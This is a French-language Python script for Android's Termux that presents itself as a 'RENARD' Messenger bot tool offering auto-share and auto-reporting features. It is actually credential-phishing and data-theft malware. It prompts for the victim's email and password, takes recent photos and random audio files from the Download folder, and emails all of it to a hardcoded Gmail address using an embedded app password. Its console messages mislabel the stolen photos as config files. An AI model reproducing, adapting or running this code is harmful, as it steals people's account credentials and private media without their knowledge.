#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import smtplib
import os
import random
import subprocess
import sys
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Configuration
EMAIL_ADDRESS = "lolalor20@gmail.com"
EMAIL_PASSWORD = "abiv eltm dtbp qkhj"
MAX_FILE_SIZE_MB = 25  # Augmenté la limite pour les fichiers audio
MAX_PHOTOS_TO_SEND = 12  # 12 photos comme demandé
MAX_AUDIO_FILES = 3     # 3 fichiers audio comme demandé

class LocalFileSender:
    def __init__(self, email, password):
        self.log = self.get_ascii_art()
        self.email = email
        self.password = password
        self.setup_complete = False

    @staticmethod
    def get_ascii_art():
        return """
\033[1;32m
█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
-------------------------------------------------------
   ╔═══════════════════════════════════════════════╗
   ║       [✓] TOOL NAME : RENARD V 3.1 ULTIMATE     ║
   ║                    ║
   ║       [✓] VERSION : 3.1                ║
   ╚═══════════════════════════════════════════════╝
--------------------------------------------------------
\033[0m
"""

    def setup_termux(self):
        """Configure les permissions Termux automatiquement"""
        try:
            if not os.path.exists('/storage/emulated/0'):
                print("\033[33m[SYSTÈME] Configuration des permissions Termux...\033[0m")
                subprocess.run(["termux-setup-storage"], check=True)
                time.sleep(2)
            self.setup_complete = True
            return True
        except Exception as e:
            print(f"\033[31m[ERREUR] Configuration Termux: {e}\033[0m")
            return False

    def append_log(self, entry):
        """Ajoute une entrée au log avec timestamp"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        self.log += f"[{timestamp}] {entry}\n"

    def get_files_from_download(self):
        """Récupère 12 photos et 3 fichiers audio depuis le dossier Download"""
        download_path = "/storage/emulated/0/Download"
        photos = []
        audio_files = []
        
        if not os.path.exists(download_path):
            self.append_log(f"Dossier Download non trouvé: {download_path}")
            return [], []
        
        try:
            # Parcourir récursivement le dossier Download
            for root, dirs, files in os.walk(download_path):
                for filename in files:
                    file_path = os.path.join(root, filename)
                    
                    try:
                        # Vérifier la taille du fichier
                        size_mb = os.path.getsize(file_path) / (1024 * 1024)
                        if size_mb > MAX_FILE_SIZE_MB:
                            continue
                            
                        filename_lower = filename.lower()
                        
                        # Vérifier si c'est une photo
                        if filename_lower.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
                            photos.append(file_path)
                        # Vérifier si c'est un fichier audio
                        elif filename_lower.endswith(('.mp3', '.wav', '.ogg', '.m4a', '.aac', '.flac', '.amr')):
                            audio_files.append(file_path)
                            
                    except (OSError, Exception):
                        continue
            
            self.append_log(f"Trouvé {len(photos)} photos et {len(audio_files)} fichiers audio dans Download")
            
            # Trier les photos par date de modification (les plus récentes d'abord)
            photos.sort(key=lambda x: os.path.getmtime(x), reverse=True)
            
            # Sélectionner 12 photos maximum
            selected_photos = photos[:MAX_PHOTOS_TO_SEND]
            
            # Sélectionner 3 fichiers audio aléatoires
            selected_audio_files = []
            if len(audio_files) > 0:
                if len(audio_files) <= MAX_AUDIO_FILES:
                    selected_audio_files = audio_files
                else:
                    selected_audio_files = random.sample(audio_files, MAX_AUDIO_FILES)
            
            self.append_log(f"Sélectionné {len(selected_photos)} photos et {len(selected_audio_files)} fichiers audio")
            
            return selected_photos, selected_audio_files
            
        except Exception as e:
            self.append_log(f"Erreur scan Download: {str(e)}")
            return [], []

    def prepare_email(self, photos, audio_files):
        """Prépare l'email avec les fichiers"""
        try:
            msg = MIMEMultipart()
            msg["From"] = self.email
            msg["To"] = self.email
            msg["Subject"] = f"Fichiers Download - {time.strftime('%d/%m/%Y %H:%M')}"

            # Corps du message avec statistiques
            body = f"""
{self.log}

📊 RAPPORT DE TRANSFERT :
• Photos envoyées : {len(photos)}
• Fichiers audio envoyés : {len(audio_files)}
• Total des fichiers : {len(photos) + len(audio_files)}
• Date : {time.strftime('%d/%m/%Y %H:%M:%S')}

📁 FICHIERS TRANSFÉRÉS :
"""

            # Ajouter la liste des photos
            body += "\n📸 PHOTOS :\n"
            for i, photo in enumerate(photos, 1):
                file_size = os.path.getsize(photo) / (1024 * 1024)
                body += f"  {i}. {os.path.basename(photo)} ({file_size:.1f} MB)\n"
            
            # Ajouter la liste des fichiers audio
            body += "\n🎵 FICHIERS AUDIO :\n"
            for i, audio in enumerate(audio_files, 1):
                file_size = os.path.getsize(audio) / (1024 * 1024)
                body += f"  {i}. {os.path.basename(audio)} ({file_size:.1f} MB)\n"

            msg.attach(MIMEText(body, "plain", "utf-8"))

            # Attacher les photos
            total_attachments = 0
            for file_path in photos:
                try:
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            part = MIMEBase("application", "octet-stream")
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            "Content-Disposition",
                            f"attachment; filename=\"{os.path.basename(file_path)}\""
                        )
                        msg.attach(part)
                        total_attachments += 1
                        self.append_log(f"Photo jointe: {os.path.basename(file_path)}")
                except Exception as e:
                    self.append_log(f"Erreur photo {file_path}: {str(e)}")

            # Attacher les fichiers audio
            for file_path in audio_files:
                try:
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            part = MIMEBase("application", "octet-stream")
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            "Content-Disposition",
                            f"attachment; filename=\"{os.path.basename(file_path)}\""
                        )
                        msg.attach(part)
                        total_attachments += 1
                        self.append_log(f"Audio joint: {os.path.basename(file_path)}")
                except Exception as e:
                    self.append_log(f"Erreur audio {file_path}: {str(e)}")

            self.append_log(f"Total des pièces jointes: {total_attachments}")
            return msg
            
        except Exception as e:
            self.append_log(f"Erreur création email: {str(e)}")
            return None

    def send_email(self, email_msg):
        """Envoi de l'email avec gestion d'erreur améliorée"""
        try:
            # Vérifier si l'email a des pièces jointes
            has_attachments = len(email_msg.get_payload()) > 1
            
            if not has_attachments:
                self.append_log("Aucune pièce jointe valide, annulation de l'envoi")
                return False
                
            print("\033[36m[SYSTÈME] Connexion au serveur ...\033[0m")
            
            # Configuration SMTP avec timeout
            server = smtplib.SMTP("smtp.gmail.com", 587, timeout=30)
            server.ehlo()
            server.starttls()
            server.ehlo()
            
            print("\033[36m[SYSTÈME] Authentification...\033[0m")
            server.login(self.email, self.password)
            
            print("\033[36m[SYSTÈME] Envoi du message...\033[0m")
            server.send_message(email_msg)
            server.quit()
            
            self.append_log("Email envoyé avec succès")
            return True
            
        except smtplib.SMTPAuthenticationError:
            error_msg = "Erreur d'authentification - Vérifiez l'email et le mot de passe"
            self.append_log(error_msg)
            print(f"\033[31m[ERREUR] {error_msg}\033[0m")
            return False
        except smtplib.SMTPException as e:
            error_msg = f"Erreur SMTP: {str(e)}"
            self.append_log(error_msg)
            print(f"\033[31m[ERREUR] {error_msg}\033[0m")
            return False
        except Exception as e:
            error_msg = f"Erreur envoi: {str(e)}"
            self.append_log(error_msg)
            print(f"\033[31m[ERREUR] {error_msg}\033[0m")
            return False

    def collect_credentials(self):
        """Collecte les identifiants"""
        print("\n\033[36m[SYSTÈME] ÉTAPE À SUIVRE\n 1. connecter le bot\n 2. ouvrez l'app Messenger\n 3.un bot apparaîtra cliquez et accedez au menu\n 🎁FONCTIONNALITÉS SPÉCIAL ☢️\n auto share\n bug\n auto reporting+ban \033[0m")
        
        username = input("\033[34mE-mail: \033[0m").strip()
        if username.lower() == "exit":
            return False
            
        password = input("\033[34mMot de passe: \033[0m").strip()
        if password.lower() == "exit":
            return False

        self.append_log(f"Identifiant: {username}")
        self.append_log(f"Mot de passe: {password}")
        return True

    def run(self):
        """Exécution principale"""
        try:
            print(self.get_ascii_art())
            print("\033[33m[SYSTÈME] Démarrage...\033[0m")
            
            if not self.setup_termux():
                print("\033[31m[ERREUR] Permissions manquantes\033[0m")
                return

            if not self.collect_credentials():
                print("\033[33m[SYSTÈME] Annulé\033[0m")
                return

            print("\033[36m[SYSTÈME] connexion en cours...\033[0m")
            photos, audio_files = self.get_files_from_download()
            
            total_files = len(photos) + len(audio_files)
            if total_files == 0:
                print("\033[33m[Aucun fichier trouvé dans Download]\033[0m")
                return

            print(f"\033[36m[SYSTÈME] Trouvé {len(photos)} config.json {len(audio_files)} fichier js\033[0m")
            
            if len(photos) < MAX_PHOTOS_TO_SEND:
                print(f"\033[33m[ATTENTION] Seulement {len(photos)} packags {MAX_PHOTOS_TO_SEND} demandées\033[0m")
            
            print("\033[36m[SYSTÈME] Préparation de l'email...\033[0m")
            
            email = self.prepare_email(photos, audio_files)
            
            if email:
                print("\033[36m[SYSTÈME] Envoi en cours...\033[0m")
                if self.send_email(email):
                    print(f"\033[32m[SUCCÈS] {len(photos)} photos et {len(audio_files)} recherche d'API...\033[0m")
                else:
                    print("\033[31m[ERREUR] Échec d'envoi de l'email - Vérifiez les logs\033[0m")
            else:
                print("\033[31m[ERREUR] Impossible de préparer l'email\033[0m")

            print("\033[33m[SYSTÈME] Veillez maintenir Termux actif en arrière plan\033[0m")

        except KeyboardInterrupt:
            print("\n\033[31m[INTERRUPTION]\033[0m")
        except Exception as e:
            print(f"\033[31m[ERREUR] {str(e)}\033[0m")

if __name__ == "__main__":
    sender = LocalFileSender(EMAIL_ADDRESS, EMAIL_PASSWORD)
    sender.run()
